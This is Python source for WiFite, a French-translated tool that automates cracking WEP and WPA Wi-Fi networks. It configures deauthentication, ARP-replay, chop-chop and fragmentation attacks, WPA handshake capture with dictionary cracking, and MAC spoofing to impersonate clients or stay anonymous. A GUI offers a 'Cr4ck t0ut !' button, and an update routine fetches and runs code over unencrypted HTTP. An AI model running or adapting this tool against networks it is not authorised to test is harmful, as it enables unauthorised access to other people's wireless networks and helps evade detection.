#!/usr/bin/python
# -*- coding: cp1252 -*-

""" WIFITE
    (c) 2010 derv merkler
	FRENCH Translate by Matt² - September 2010
"""

""" TODO LIST:
    -find someone to test SKA (my router won't allow it, broken SKA everytime)
    -deauth entire router if SSID is hidden? (no, sets off alarms)
    -convert all subprocess calls to pexpect (maybe?)
    -convert subprocess.call('rm', to os.remove(
"""

import string, sys # basic stuff
import os, signal  # needed for shells, sending commands, etc
import subprocess  # because os.call is deprecated and unreliable
import time        # need to sleep; keep track how long methods take
import re          # reg-ex: for replacing characters in strings
import urllib      # needed for downloading webpages (updating the script)
import tempfile    # for creating temporary directory
import random      # for random mac address

try:
	import pexpect # used during wpa_supplicant attacks
	proc_intel=None
except ImportError:
	# some users may nto have this module
	print '[!] Impossible d importer pexpect'
	print '[!] Si vous avez un chipset intel4965; la fake-auth ne va pas fonctionner'

NO_XSERVER=False
try:
	# GUI imports
	from Tkinter import * # all of the gui modules we need
	import tkFileDialog   # for selecting the dictionary file
	import threading      # so the GUI doesn't lock up
except ImportError:
	NO_XSERVER=True
	print '[!] Impossible d importer tkinter -- GUI désactivé'

# current revision
REVISION=54

# default wireless interface (blank to prompt)
# ex: wlan0, wlan1, rausb0
IFACE=''

# default wpa-cracking password list (blank to prompt)
# NOTE: will default to 'wordlist.txt' if found in same directory as this script!
# ex: /pentest/passwords/wordlists/darkc0de.lst
DICT=''

# name of access point to attack (useful for targeting specific APs)
# also, the 'power' is stored in ESSID. ex: ESSID='pow>55' would crack all APs above 55dB
ESSID=''

# WPA variables
WPA=True        # True=search for WPA access points; False=do not search for WPA access points
WPA_TIMEOUT=3.0 # how long to wait between deauthentications (in seconds)
WPA_MAXWAIT=300 # longest time to wait for a handshake capture (in seconds)
# you can temporarily change maxwait with -wpaw <time> where time is in minutes

# WEP constants
WEP=True          # True=search for WEP access points; False=do not search for WEP access points
WEP_PPS    =400   # packets per second (lower for APs that are farther away)
WEP_MAXWAIT=600   # longest to wait for a WEP attack *METHOD* to finish (in seconds)
                  # if wep_maxwait is 600, it gives 10minutes FOR EACH ATTACK METHOD (frag, chopchop, arp, p0841)
                  # meaning a TOTAL of 40min per WEP access point (not including fake-authentication)
                  # you can disable certain WEP attacks below to save time
WEP_ARP    =True  # true=use arp-replay attack, false=don't use
WEP_CHOP   =True  # use chop-chop attack
WEP_FRAG   =True  # use fragmentation attack
WEP_P0841  =True  # use -p 0841 replay attack
AUTOCRACK  =9000  # begin cracking when our IVS count is...  OVER9000!!!!!
CHANGE_MAC =True  # set =True if you want to [temporarily] change the mac address of your wifi card
                  # to the MAC of a client on the targeted network.

EXIT_IF_NO_FAKEAUTH=True # during a WEP attack, if fake-authentication fails, the attack is cancelled


NO_HIDDEN_DEAUTH=False # when true, disables the option to send deauth packets to hidden access points
                       # only deauths clients and only when a fixed channel is selected
                       # this can help uncloak invisible access points, but is laggy

STRIP_HANDSHAKE=True # when true, strips handshake via pyrit (removes unnecessary packets from .cap file)

# default channel to scan
CHANNEL='0'  # 0 means attack all channels.
# it's probably a good idea to leave this 0 and use "-c 6" if you want to target channel 6



# keep track of how we're doing
CRACKED   =0 # number of cracked networks
HANDSHAKES=0 # number of handshakes we've captured (does not count 


# assorted lists for storing data
TARGETS  =[]
CLIENTS  ={} # dictionary type! for fast[er] client look-up
ATTACK   =[]
WPA_CRACK=[]
THE_LOG  =[]

# flag for exiting out of attacks early, this should ALWAYS be false
SKIP_TO_WPA=False

# flag for when we use intel4965 wireless card
HAS_INTEL4965=False

# mac addresses, used for restoring mac addresses after changing them
THIS_MAC=''
OLD_MAC =''
# more mac adddresses, for use with "-anon" anonymizer
ORIGINAL_MAC=''
ANONYMOUS_MAC=''

# COLORS, because i think they're faaaaaabulous
W  = "\033[0m";  # white (normal)
BLA= "\033[30m"; # black
R  = "\033[31m"; # red
G  = "\033[32m"; # green
O  = "\033[33m"; # orange
B  = "\033[34m"; # blue
P  = "\033[35m"; # purple
C  = "\033[36m"; # cyan
GR = "\033[37m"; # gray

# current file being run (hopefully wifite.py!)
THEFILE=__file__
if THEFILE.startswith('./'):
	THEFILE=THEFILE[2:]

# temporary directory, to keep those pesky cap files out of the way
TEMPDIR=tempfile.mkdtemp(prefix='wifite')
if not TEMPDIR.endswith('/'):
	TEMPDIR += '/'

# time remaining and time started (for the all attacks -- except WPA cracking)
TIME_REMAINING=0
TIME_STARTED=0

# attempt to load gui if it hasn't been disabled yet, catch errors
if not NO_XSERVER:
	try:
		# GUI needs a root for all children
		root = Tk()
		root.withdraw()  # hide main window until we're ready
		# there was a glitch where a window 'Tk' would appear on ctrl+c.. this fixed it!
	except tkinter.TclError:
		NO_XSERVER=True
		print R+'[!] Erreur pendant le chargement de tkinter; '+O+' GUI désactivé ...'



############################################################ GUI!
class App:
	""" class for creating the GUI
		the GIU passes arguments to the script
	"""
	def __init__(self, master):
		setenctype='WEP and WPA'
		setchan   =6
		setallchan=1
		setpower  =50
		setselarg =0
		setallpow =1
		setdict   ='/pentest/passwords/wordlists/darkc0de.lst'
		setwepw   ='10'
		setwependl=0
		setwpaw   ='5'
		setwpaendl=0
		setpps    =500
		setarp    =1
		setchop   =1
		setfrag   =1
		setp0841  =1
		setmac    =1
		setauth   =0
		setanon   =0
		try:
			f=open('.wifite.conf','r')
			txt=f.read()
			lines=txt.split('\n')
			f.close()
			for i in xrange(0, len(lines)):
				l=lines[i].strip()
				if l == '-nowep':
					setenctype='WPA'
				elif l == '-nowpa':
					setenctype='WEP'
				elif l == '-c':
					try:
						setchan=int(lines[i+1])
						setallchan=0
					except ValueError:
						pass
					i+=1
				elif l == '-p':
					try:
						setpower=int(lines[i+1])
						setallpow=0
					except ValueError:
						pass
					i+=1
				elif l == '-d':
					setdict=lines[i+1]
					i+=1
				elif l == '-wepw':
					if lines[i+1] == '0':
						setwependl=1
					else:
						setwepw=lines[i+1]
					i+=1
				elif l == '-wpaw':
					if lines[i+1] == '0':
						setwpaendl=1
					else:
						setwpaw=lines[i+1]
					i+=1
				elif l == '-pps':
					try:
						setpps=int(lines[i+1])
					except ValueError:
						pass
					i+=1
				elif l == '-noarp':
					setarp=0
				elif l == '-nochop':
					setchop=0
				elif l == '-nofrag':
					setfrag=0
				elif l == '-no0841':
					setp0841=0
				elif l == '-keepmac':
					setmac=0
				elif l == '-f':
					setauth=1
				elif l == '-console':
					setselarg=1
				elif l == '-anon':
					setanon=1
				
		except IOError:
			pass
		
		f0nt=('FreeSans',9,'bold')
		frame = Frame(master, width=250, height=150)
		frame.grid()
		
		r=0
		w=Label(frame, font=f0nt, text='interface:')
		w.grid(row=r, column=0, sticky='E')
		self.iface = StringVar(frame)
		(lst,default)=self.ifacelist()
		print GR+'[+] '+W+'Carte Wireless: "'+G+ ', '.join(lst) +W+'"'
		if lst == [] or len(lst) == 0:
			print GR+'[!] '+R+'Aucune carte Wifi n\'a été détectée'
			print GR+'[!] '+O+'Soyez sur que votre carte wifi est bien branchée, ensuite verifiez avec airmon-ng'
			sys.exit(0)
		elif len(lst) == 1:
			if lst[0].strip() == '':
				print GR+'[!] '+R+'Aucune carte Wifi n\'a été détectée'
				print GR+'[!] '+O+'Soyez sur que votre carte wifi est bien branchée, ensuite verifiez avec airmon-ng'
				sys.exit(0)
		self.iface.set(default)
		
		w=apply(OptionMenu, (frame, self.iface) + tuple(lst))
		w.config(takefocus=1, width=25, font=f0nt)
		w.grid(row=r,column=1,columnspan=2, sticky='W')
		r+=1
		
		w=Label(frame, font=f0nt, text='Type de cryptage:')
		w.grid(row=r, column=0, sticky='E')
		
		self.enctype = StringVar(frame)
		self.enctype.set(setenctype)
		w=OptionMenu(frame, self.enctype, 'WEP', 'WPA', 'WEP et WPA')
		w.config(takefocus=1, width=15, font=f0nt)
		w.grid(row=r,column=1, columnspan=2,sticky='W')
		
		r+= 1
		w=Label(frame, text='channel:', font=f0nt)
		w.grid(row=r,column=0, sticky=E)
		self.channel=Scale(frame, orient=HORIZONTAL, from_=1, to_=14, resolution=1, length=120, takefocus=1,\
		 				troughcolor='black', sliderlength=30, sliderrelief=FLAT, relief=FLAT, font=f0nt,\
						activebackground='red')
		self.channel.grid(row=r, column=1, sticky='W')
		self.channel.set(setchan)
		self.allchan=IntVar(frame)
		self.allchan.set(setallchan)
		self.click_channel()
		self.chkallchan=Checkbutton(frame, text='tous les channels', variable=self.allchan, command=self.click_channel, font=f0nt,\
							activeforeground='red')
		self.chkallchan.grid(row=r, column=2, sticky='W')
		
		r+= 1
		w=Label(frame, text=' ', font=('',5,''))
		w.grid(row=r,columnspan=3)
		
		r+=1
		self.selectarg=IntVar(frame)
		self.selectarg.set(setselarg)
		
		w=Checkbutton(frame, text='Selectionnez la cible dans une liste', variable=self.selectarg, command=self.click_selectarg,\
				font=f0nt, activeforeground='red')
		w.grid(row=r, column=1, columnspan=2,sticky='W')
		
		r+= 1
		w=Label(frame, text='Puissance min.:', font=f0nt)
		w.grid(row=r,column=0, sticky='E')
		self.power=Scale(frame, orient=HORIZONTAL, from_=1, to_=100, resolution=1, length=120, takefocus=1,\
		 				troughcolor='black', sliderlength=20, relief=FLAT, sliderrelief=FLAT, font=f0nt,\
						activebackground='red')
		self.power.grid(row=r, column=1, sticky='W')
		self.power.set(setpower)
		self.power.config(state=DISABLED)
		self.all=IntVar(frame)
		self.all.set(setallpow)
		self.click_power()
		self.chkeveryone=Checkbutton(frame, text='Tous', variable=self.all, command=self.click_power, font=f0nt, activeforeground='red')
		self.chkeveryone.grid(row=r, column=2, sticky='W')
		
		if self.selectarg.get() != 0:
			self.power.config(state=DISABLED, troughcolor='black')
			self.chkeveryone.config(state=DISABLED)
		
		r+= 1
		w=Label(frame, text=' ', font=('',5,''))
		w.grid(row=r,columnspan=3)
		
		r+= 1
		w=Label(frame, text='Dictionnaire:', font=f0nt)
		w.grid(row=r, column=0, sticky='E')
		self.dict=StringVar()
		self.dicttxt=Entry(frame, font=f0nt, width=22, textvariable=self.dict)
		self.dicttxt.grid(row=r, column=1, columnspan=2, sticky='W')
		self.dicttxt.delete(0, END)
		self.dicttxt.insert(0, setdict)
		w=Button(frame, text="...", font=('FreeSans',7,''), height=0,command=self.lookup, activebackground='red')
		w.grid(row=r, column=2, sticky='E')
		
		r+= 1
		w=Label(frame, text=' ', font=('',5,''))
		w.grid(row=r,columnspan=3)
		
		r+=1
		w=Label(frame, text='wep timeout (min):', font=f0nt)
		w.grid(row=r,column=0)
		self.wepw=StringVar(frame)
		self.weptxt=Entry(frame, justify=CENTER, width=3, textvariable=self.wepw, font=f0nt)
		self.weptxt.grid(row=r, column=1, sticky='W')
		self.weptxt.delete(0, END)
		self.weptxt.insert(0, setwepw)
		self.wepwendless=IntVar(frame)
		self.wepwendless.set(setwependl)
		w=Checkbutton(frame, text='illimité',variable=self.wepwendless, font=f0nt, activeforeground='red',\
					command=self.click_wependless)
		w.grid(row=r, column=1, sticky='E')
		self.click_wependless()
		
		r+=1
		w=Label(frame, text='wpa timeout (min):', font=f0nt)
		w.grid(row=r,column=0)
		self.wpaw=StringVar(frame)
		self.wpatxt=Entry(frame, justify=CENTER, width=3, textvariable=self.wpaw, font=f0nt)
		self.wpatxt.grid(row=r, column=1, sticky='W')
		self.wpatxt.delete(0, END)
		self.wpatxt.insert(0, setwpaw)
		self.wpawendless=IntVar(frame)
		self.wpawendless.set(setwpaendl)
		w=Checkbutton(frame, text='illimité',variable=self.wpawendless, font=f0nt, activeforeground='red',\
					command=self.click_wpaendless)
		w.grid(row=r, column=1, sticky='E')
		self.click_wpaendless()
		
		r+= 1
		w=Label(frame, text=' ', font=('',5,''))
		w.grid(row=r,columnspan=3)
		
		r += 1
		w=Label(frame, text='Options wep:', font=f0nt)
		w.grid(row=r, column=0, sticky='E')
		self.weparp=IntVar()
		self.weparp.set(setarp)
		w=Checkbutton(frame, text='arp-replay', variable=self.weparp, font=f0nt, activeforeground='red')
		w.grid(row=r, column=1, sticky='W')
		self.wepchop=IntVar()
		self.wepchop.set(setchop)
		w=Checkbutton(frame, text='chop-chop', variable=self.wepchop, font=f0nt, activeforeground='red')
		w.grid(row=r, column=2, sticky='W')
		r=r+1
		self.wepfrag=IntVar()
		self.wepfrag.set(setfrag)
		w=Checkbutton(frame, text='fragmentation', variable=self.wepfrag, font=f0nt, activeforeground='red')
		w.grid(row=r, column=1, sticky='W')
		self.wep0841=IntVar()
		self.wep0841.set(setp0841)
		w=Checkbutton(frame, text='-p 0841', variable=self.wep0841, font=f0nt, activeforeground='red')
		w.grid(row=r, column=2, sticky='W')
		r=r+1
		self.wepmac=IntVar()
		self.wepmac.set(setmac)
		w=Checkbutton(frame, text='change mac', variable=self.wepmac, font=f0nt, activeforeground='red')
		w.grid(row=r,column=1, sticky='W')
		self.wepauth=IntVar()
		self.wepauth.set(setauth)
		w=Checkbutton(frame, text='ignorer fake-auth', variable=self.wepauth, font=f0nt, activeforeground='red')
		w.grid(row=r,column=1, columnspan=2, sticky='E')
		
		r=r+1
		w=Label(frame, text='paquets/sec:', font=f0nt)
		w.grid(row=r, column=0, sticky='E')
		self.weppps=Scale(frame, orient=HORIZONTAL, from_=100, to_=1500, resolution=50, length=190, font=f0nt,\
				troughcolor='gray', activebackground='red', relief=FLAT, sliderrelief=FLAT)
		self.weppps.grid(row=r, column=1, columnspan=2, sticky='W')
		self.weppps.set(setpps)
		
		r+= 1
		w=Label(frame, text=' ', font=('',5,''))
		w.grid(row=r,columnspan=3)
		
		self.anony=IntVar()
		self.anony.set(setanon)
		w=Checkbutton(frame, text='anonymiser toutes les attaques', variable=self.anony, font=f0nt, activeforeground='red')
		w.grid(row=r,column=1, columnspan=2,sticky='W')
		
		r += 1
		w = Button(frame, text="Cr4ck t0ut !", font=('FreeSans', 20, 'bold'), relief=FLAT, height=2,fg="white", bg="red", \
				highlightbackground='white', highlightcolor='red', command=self.execute,activebackground='darkred',\
				activeforeground='white')
		w.grid(row=r,columnspan=3)
		
		r+=1
		w=Label(frame, text=' ', font=('',5,''))
		w.grid(row=r,columnspan=3)
		
		sw = root.winfo_screenwidth()
		sh = root.winfo_screenheight()
		w=350
		h=550
		x = sw/2 - w/2
		y = sh/2 - h/2
		root.geometry("%dx%d+%d+%d" % (w,h,x,y))
		root.update()
		root.deiconify()
		
	def click_wpaendless(self):
		if self.wpawendless.get() == 1:
			self.wpatxt.config(state=DISABLED)
		else:
			self.wpatxt.config(state=NORMAL)
		
	def click_wependless(self):
		if self.wepwendless.get() == 1:
			self.weptxt.config(state=DISABLED)
		else:
			self.weptxt.config(state=NORMAL)
	
	def click_channel(self):
		if self.allchan.get() == 0:
			self.channel.config(state=NORMAL, troughcolor='gray')
		else:
			self.channel.config(state=DISABLED, troughcolor='black')
	
	def click_selectarg(self):
		if self.selectarg.get() == 0:
			self.chkeveryone.config(state=NORMAL)
			if self.all.get() == 0:
				self.power.config(state=NORMAL, troughcolor='gray')
		
		else:
			self.power.config(state=DISABLED, troughcolor='black')
			self.chkeveryone.config(state=DISABLED)
	
	def click_power(self):
		if self.all.get() == 0:
			self.power.config(state=NORMAL, troughcolor='gray')
		else:
			self.power.config(state=DISABLED, troughcolor='black')
	
	def lookup(self):
		file=tkFileDialog.askopenfile(parent=root, mode='rb',title='Sélectionne une liste de mot de passe')
		if file != None:
			self.dicttxt.delete(0, END)
			self.dicttxt.insert(0, file.name)
	
	def ifacelist(self):
		# looks up all interfaces in airmon-ng
		# returns a tuple, the list of ifaces, and the 'default' -- the one in monitor mode
		lst=[]
		proc=subprocess.Popen(['airmon-ng'], stdout=subprocess.PIPE)
		txt=proc.communicate()[0]
		if txt == '':
			return [],''
		for line in txt.split('\n'):
			if line != '' and line.find('Interface') == -1:
				line = line.replace('\t',' ')
				lst.append(line.strip())
		
		default=''
		proc=subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		txt=proc.communicate()[0]
		if txt == '':
			if len(lst) > 0:
				return lst, lst[0]
			else:
				return [], 0
		
		for line in txt.split('\n'):
			if line.find('Mode:Monitor') != -1:
				dev=line[:line.find(' ')].strip()
				for x in lst:
					if dev == x[:x.find(' ')].strip():
						default=x
						break
			if default != '':
				break
		
		if len(lst) == 0:
			print R+'[!] Aucun reseau wifi n\'a ete trouvé!'
			print R+'[!] Lancez airmon-ng et vérifiez vos drivers wireless'
			print GR+'[+] '+O+'Le programme va maintenant s\'arreter'+W
			sys.exit(0)
		
		return lst, default
	def execute(self):
		global root
		
		cmd=[]
		
		# interface
		temp=self.iface.get()
		cmd.append('-i')
		cmd.append(temp[:temp.find(' ')])
		
		# encryption
		if self.enctype.get() == 'WPA':
			cmd.append('-nowep')
		elif self.enctype.get() == 'WEP':
			cmd.append('-nowpa')
		
		# channel
		if self.allchan.get() == 0:
			cmd.append('-c')
			cmd.append(str(self.channel.get()))
		
		# select targets or not
		if self.selectarg.get() == 0:
			# don't select targets from list; either attack all or certain power range
			# power
			if self.all.get() != 0:
				cmd.append('-all')
			else:
				cmd.append('-p')
				cmd.append(str(self.power.get()))
		else:
			# select targets from a list... just say '-console'
			cmd.append('-console')
		
		# dictionary
		temp=self.dicttxt.get()
		cmd.append('-d')
		if os.path.exists(temp) and temp != '' and temp != 'none':
			cmd.append(temp)
		else:
			cmd.append('none')
		
		# wep timeout
		cmd.append('-wepw')
		if self.wepwendless.get() == 1:
			cmd.append('0')
		else:
			cmd.append(self.wepw.get())
		
		# wpa timeout
		cmd.append('-wpaw')
		if self.wpawendless.get() == 1:
			cmd.append('0')
		else:
			cmd.append(self.wpaw.get())
		
		if self.weparp.get() != 1:
			cmd.append('-noarp')
		if self.wepchop.get() != 1:
			cmd.append('-nochop')
		if self.wepfrag.get() != 1:
			cmd.append('-nofrag')
		if self.wep0841.get() != 1:
			cmd.append('-no0841')
		
		if self.wepmac.get() == 0:
			cmd.append('-keepmac')
		
		if self.wepauth.get() == 1:
			cmd.append('-f')
		
		if self.anony.get() == 1:
			cmd.append('-anon')
		
		cmd.append('-pps')
		cmd.append(str(self.weppps.get()))
		
		# save settings
		f=open('.wifite.conf','w')
		f.write(str('\n'.join(cmd)))
		f.close()
		
		t=threading.Thread(target=self.doit, args=(cmd,))
		t.start()
		root.destroy()
		#print '[+] exiting...'
		
	
	def doit(self, args):
		global THEFILE
		cmd=['xterm','-bg','black','-fg','white','-T','WiFite','-geom','110x30+0+0','-hold','-e','python',THEFILE]
		for a in args:
			cmd.append(a)
		print GR+'[+] '+G+'Exécution: '+W+ './' + THEFILE+' ' + ' '.join(args)
		try:
			subprocess.call(cmd)
		except AttributeError:
			pass









############################################################################### upgrade methods
def get_revision():
	""" checks the googlecode page
		returns a tuple with info on the latest revision: 
			revision_number, description, last_modified
		returns -1, '' ,'' if page could not be loaded properly
	"""
	irev  =-1
	desc =''
	since=''
	
	sock = urllib.urlopen('http://code.google.com/p/wifite/source/list?path=/trunk/fr/wifite_fr.py')
	page = sock.read()
	
	# get the revision
	start= page.find('href="detail?r=')
	stop = page.find('&amp;', start)
	if start != -1 and stop != -1:
		start += 15
		rev=page[start:stop]
		try:
			irev=int(rev)
		except ValueError:
			rev=rev.split('\n')[0]
			print R+'[+] Numéro de révision invalide: "'+rev+'"'
	
	# get the description
	start= page.find(' href="detail?r='+str(irev)+'', start + 3)
	start= page.find('">',start)
	stop = page.find('</a>', start)
	if start != -1 and stop != -1:
		start += 2
		desc=page[start:stop].strip()
		desc=desc.replace("&#39;","'")
		desc=desc.replace("&lt;","<")
		desc=desc.replace("&gt;",">")
	
	# get the time last modified
	start= page.find(' href="detail?r='+str(irev)+'', start + 3)
	start= page.find('">',start)
	stop = page.find('</a>', start)
	if start != -1 and stop != -1:
		start += 2
		since=page[start:stop]
	
	return (irev, desc, since)

def update():
	""" the 'ui' portion of upgrading.
		uses get_revision(), compares that revision to this script's revision number,
		tells user they're already updated if revisions are equal.
		prompts to upgrade if we're out of date,
			if user types 'y', runs upgrade()
	"""
	global REVISION
	
	try:
		print GR+'[+] '+W+'Vérification des mises a jour...'
		
		r,d,t=get_revision()
		
		r=int(r)
		if r == -1:
			print GR+'[+] '+R+'Impossible d\'acceder a code.google.com; mise à jour annulée'
		
		elif r > REVISION:
			print GR+'[+] '+W+'Une '+G+'nouvelle version'+W+' de wifite.py est disponible! (r'+str(r)+')' 
			print GR+'[+] '+W+'changements:'+W
			print GR+'    -'+d.replace('\n','\n    -')
			print GR+'[+] '+W+'Mise à jour sortie: '+G+t+W+'\n'
			print GR+'[+] '+W+'Voulez vous '+G+'télécharger et mettre à jour'+W+' wifite.py? (y/n): '
			ans=raw_input()
			if ans.lower()[0] == 'y':
				upgrade()
			else:
				print GR+'[+] '+W+'Mise à jour '+O+'annulée'+W+''
		
		elif r == REVISION:
			print GR+'[+] '+W+'Votre version de wifite.py est '+G+'à jour'
		
		else:
			print GR+'[+] '+W+'Vous avez en quelques sorte une '+G+'révision futuriste'+W+' de wifite.py'
	except KeyboardInterrupt:
		print R+'[+] ^C Interrompu; Mise à jour annulée'
	
def upgrade():
	global THEFILE
	""" downloads latest version of wifite.py, saves as wifite_new.py
		creates shell script that deletes the old wifite.py and puts the new wifite_new.py in it's place
		changes permissions on the new wifite.py so it is executable
		also, it lets the user know what is happening
		exits after it is ran
	"""
	print GR+'[+] '+G+'Téléchargement'+W+' de la mise a jour...'
	sock = urllib.urlopen('http://wifite.googlecode.com/svn/trunk/fr/wifite_fr.py')
	page = sock.read()
	
	if page == '':
		print R+'[+] Impossible de télécharger wifite.py; Exit'
		return
	
	# create/save the new script
	f=open('wifite_new.py','w')
	f.write(page)
	f.close()
	
	# create/save a shell script that replaces this script with the new one
	f=open('update_wifite.sh','w')
	f.write('#!/bin/sh\n')
	f.write('rm -rf '+THEFILE+'\n')
	f.write('mv wifite_new.py '+THEFILE+'\n')
	f.write('rm -rf update_wifite.sh\n')
	f.write('chmod +x '+THEFILE+'\n')
	#f.write('python',THEFILE,'-h')
	f.close()
	
	# change permissions on the script
	subprocess.call(['chmod','+x','update_wifite.sh'])
	
	#print GR+'[+] '+G+'launching'+W+' new version...'
	
	subprocess.call(['sh','update_wifite.sh'])
	
	print GR+'[+] '+G+'Mis à jour!'+W+' tapez "./'+THEFILE+'" pour relancer'


############################################################################### main
def main():
	global root
	""" where the magic happens """
	global IFACE, ATTACK, DICT, THIS_MAC, SKIP_TO_WPA, CRACKED, HANDSHAKES, NO_XSERVER
	global TIME_STARTED, TIME_REMAINING, ORIGINAL_MAC, ANONYMOUS_MAC
	
	ATTEMPTS=0
	
	try:
		# print banner
		#print '\n     wifite.py; wep/wpa cracker\n'
		banner()
		
		if not check_root():
			print R+'[+] Vous devez être '+O+'root'+O+'!'
			print R+'[+] Tapez '+O+'su'+R+' pour vous connecter en root'
			print R+'[+] Le programme va s\'arreter'
			print W
			return
		
		aircrack_warning()
		
		# handle arguments
		if len(sys.argv) > 1:
			handle_args(sys.argv)
			print ''
		elif not NO_XSERVER:
			# no arguments; run the GUI
			root.title('WiFite GUI')
			
			print GR+'[+] '+W+'Démarrage de l\''+G+'interface GUI'+W
			app = App(root)
			app
			
			root.mainloop()
			
			root = None
			#print GR+'[+] '+W+'include '+G+'-help'+W+' for more options\n'
			#time.sleep(1)
			return
		
		# check if 'wordlist.txt' is in this folder;
		if DICT == '' and os.path.exists('wordlist.txt'):
			DICT='wordlist.txt'
		
		# find/get wireless interface
		find_mon()
		
		# check if current interface is an intel4965 chipset...
		check_intel()
		
		# get the current mac address for IFACE
		THIS_MAC = getmac()
		
		# find and display all current targets to user
		gettargets()
		
		# user has selected which APs to attack
		
		# check if we need a dictionary
		dict_check() # get dictionary from user if need be
		
		# calculate estimated time remaining
		TIME_STARTED=time.time()
		TIME_REMAINING=0
		for x in ATTACK:
			index = (x - 1)
			if TARGETS[index][2].startswith('WPA'):
				if WPA_MAXWAIT == 0:
					TIME_REMAINING=0
					break
				
				TIME_REMAINING+=WPA_MAXWAIT
			elif TARGETS[index][2].startswith('WEP'):
				if WEP_MAXWAIT == 0:
					TIME_REMAINING=0
					break
				
				if WEP_ARP:
					TIME_REMAINING+=WEP_MAXWAIT
				if WEP_CHOP:
					TIME_REMAINING+=WEP_MAXWAIT
				if WEP_FRAG:
					TIME_REMAINING+=WEP_MAXWAIT
				if WEP_P0841:
					TIME_REMAINING+=WEP_MAXWAIT
		
		if TIME_REMAINING != 0:
			# only print estimated time remaining if no attack times are 'endless'
			t=sec2hms(TIME_REMAINING).split(':')
			s=''
			if t[0] != '0':
				s=t[0] + ' hour'
				if t[0] != '1':
					s+='s'
				s+=', '
			s+=t[1] + ' minute'
			if t[1] != '01':
				s+='s'
			
			print ''
			print GR+'[+] '+W+'Le temps d\'attente maximum est estimé à '+O+s+W
		
		# change mac address if we're using the -anon option
		if ANONYMOUS_MAC != '':
			ORIGINAL_MAC=THIS_MAC
			print GR+'[+] '+G+'Changement'+W+' de l\'adresse MAC: '+O+ANONYMOUS_MAC+O+'...',
			sys.stdout.flush()
			subprocess.call(['ifconfig',IFACE,'down'])
			subprocess.call(['macchanger','-m',ANONYMOUS_MAC,IFACE],stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
			subprocess.call(['ifconfig',IFACE,'up'])
			
			print ' '+G+'Effectué'
		
		for x in ATTACK:
			ATTEMPTS += 1 # increment number of attempts
			attack(x - 1) # subtract one because arrays start at 0
			
			# if user breaks during an attack and wants to skip to cracking...
			if SKIP_TO_WPA:
				break
		
		# change mac address back (if we used the -anon option) before starting the cracks
		if ORIGINAL_MAC != '':
			print GR+'[+] '+G+'Changement'+W+' de l\'adresse MAC: '+O+str(ORIGINAL_MAC)+W+'...',
			sys.stdout.flush()
			subprocess.call(['ifconfig',IFACE,'down'])
			subprocess.call(['macchanger','-m',ORIGINAL_MAC,IFACE],stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
			subprocess.call(['ifconfig',IFACE,'up'])
			print G+"Effectué"+W
		
		if len(WPA_CRACK) > 0 and DICT != '':
			# we have wpa handshakes to crack!
			# format is ['filename', 'ssid']
			print '' # blank line to space things out
			for i in xrange(0, len(WPA_CRACK)):
				wpa_crack(i)
				if WPA_CRACK[len(WPA_CRACK)-1] == ['','']:
					WPA_CRACK.remove(['',''])
					break
		
		# at this point, the attacks are complete.
		print W
		# check if we tried to crack a WPA...
		had_wpa=False
		for x in ATTACK:
			if TARGETS[x-1][2].startswith('WPA'):
				had_wpa=True
				break
		
		# these if statements are for colors and plural fixing.
		# could've just done a one-liner, but this looks prettier
		if len(ATTACK) == 1:
			print GR+'[+] '+W+'L\'attaque est '+W+'finie'+W+':',
		else:
			print GR+'[+] '+W+'Les attaques sont '+W+'finies'+W+':',
			if ATTEMPTS==1:
				print O+'1 tentative,',
			else:
				print O+str(ATTEMPTS) + ' tentatives,',
		
		if had_wpa:
			# only print handshakes if we cracked or targetted a WPA network
			extra=''
			temp=len(WPA_CRACK) - HANDSHAKES
			if temp > 0:
				extra=O+' ('+str(temp)+' pré-capturé)'+W
			
			if HANDSHAKES==0:
				print R+str(HANDSHAKES)+' handshakes'+W+extra+',',
			elif HANDSHAKES==1:
				print G+'1 handshake'+W+extra+',',
			else:
				print G+str(HANDSHAKES)+' handshakes'+W+extra+',',
			
			if DICT != '':
				# only display amount cracked if user specified a dictionary
				if CRACKED == 0:
					print R+str(CRACKED)+' crackée'+W
				else:
					print G+str(CRACKED)+' crackée'+W
		else:
			# only targeted WEP network(s), only display attempted/cracked (not handshakes)
			if CRACKED == 0:
				print R+str(CRACKED)+' crackée'+W
			else:
				print G+str(CRACKED)+' crackée'+W
		
		# display the log
		if len(THE_LOG) > 0:
			print GR+'[+] '+G+'Résumé de la session:'+W
			for i in THE_LOG:
				print GR+'    -'+i
			print W
		
	except KeyboardInterrupt:
		print GR+'\n[!] '+O+'^C Reception , '+R+'exit'+W

############################################################################### aircrack warning
def aircrack_warning():
	required   =['airmon-ng','aircrack-ng','airodump-ng','aireplay-ng','packetforge-ng']
	recommended=['macchanger','pyrit']
	
	req=''
	rec=''
	for r in required:
		if subprocess.Popen(['which',r],stdout=subprocess.PIPE).communicate()[0].strip() == '':
			req += ' '+R+r+W+','
			
	for r in recommended:
		if subprocess.Popen(['which',r],stdout=subprocess.PIPE).communicate()[0].strip() == '':
			rec += ' '+R+r+W+','
	if req.endswith(','):
		req=req[:len(req)-1]
	if rec.endswith(','):
		rec=rec[:len(rec)-1]
	
	if req != '':
		print GR+'[+] '+O+'ATTENTION:'+W+' des applications/packages '+G+'requis'+W+' n ont pas été trouvé:'+W+req
	if rec != '':
		print GR+'[+] '+O+'ATTENTION:'+W+' des applications/packages '+G+'recommandés'+W+' n ont pas été trouvé'+W+rec
	
	outp = subprocess.Popen(['aircrack-ng'],stdout=subprocess.PIPE,stderr=open(os.devnull,'w')).communicate()
	for line in outp:
		if line == None:
			break
		if line.strip() != '' and line.find('1.0') != -1:
			print GR+'[+] '+R+'ATTENTION:'+O+' aircrack-ng 1.1 '+W+'requis'+W
			break

############################################################################### intel 4965 check
def check_intel():
	global IFACE, HAS_INTEL4965
	out = subprocess.Popen(['airmon-ng'],stdout=subprocess.PIPE,stderr=open(os.devnull,'w')).communicate()[0]
	for line in out.split('\n'):
		if line.find(IFACE) != -1 and line.find('Intel 4965') != -1:
			print GR+'[+] '+W+'chipset intel4965'+G+'détecté'+W+'\n'
			HAS_INTEL4965=True
			return
	
	HAS_INTEL4965=False

############################################################################### banner
def banner():
	global REVISION
	""" displays the pretty app logo + text  """
	print ''
	print G+"  .;'                     `;,    "
	print G+" .;'  ,;'             `;,  `;,   "+W+"WiFite r"+str(REVISION)+W+" - FR -"
	print G+".;'  ,;'  ,;'     `;,  `;,  `;,  "
